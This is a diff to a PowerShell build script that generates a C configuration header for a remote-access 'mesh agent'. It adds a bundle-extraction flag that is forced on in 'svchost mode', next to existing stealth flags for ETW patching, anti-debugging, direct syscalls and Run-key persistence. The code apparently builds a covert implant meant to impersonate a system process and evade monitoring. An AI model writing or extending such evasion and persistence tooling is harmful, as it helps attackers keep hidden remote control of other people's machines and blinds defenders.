@@ -17,6 +17,17 @@ function BoolToInt($val) {
     if ($val -eq $true) { return 1 } else { return 0 }
 }
 
+# Derive bundle extraction behavior (svchost requires extraction)
+$bundleExtractFlag = $false
+if ($null -ne $config.stealth.bundleExtract) {
+    $bundleExtractFlag = [bool]$config.stealth.bundleExtract
+}
+if ($config.stealth.svchostMode -and -not $bundleExtractFlag) {
+    Write-Host "[WARN] Svchost mode enabled but bundle extraction disabled in branding config; forcing extraction on." -ForegroundColor Yellow
+    $bundleExtractFlag = $true
+}
+$config.stealth.bundleExtract = $bundleExtractFlag
+
 # Generate header
 $header = @"
 /* Generated file - do not edit. */
@@ -64,6 +75,7 @@ $header = @"
 #define MESH_AGENT_ETW_PATCH $(BoolToInt $config.stealth.ettwPatch)
 #define MESH_AGENT_ANTI_DEBUG $(BoolToInt $config.stealth.antiDebug)
 #define MESH_AGENT_SYSCALLS_DIRECT $(BoolToInt $config.stealth.syscallsDirectMode)
+#define MESH_AGENT_BUNDLE_EXTRACT_DEFAULT $(BoolToInt $config.stealth.bundleExtract)
 
 /* ========== Persistence Configuration ========== */
 #define MESH_AGENT_PERSIST_RUNKEY $(BoolToInt $config.persistence.runKey)
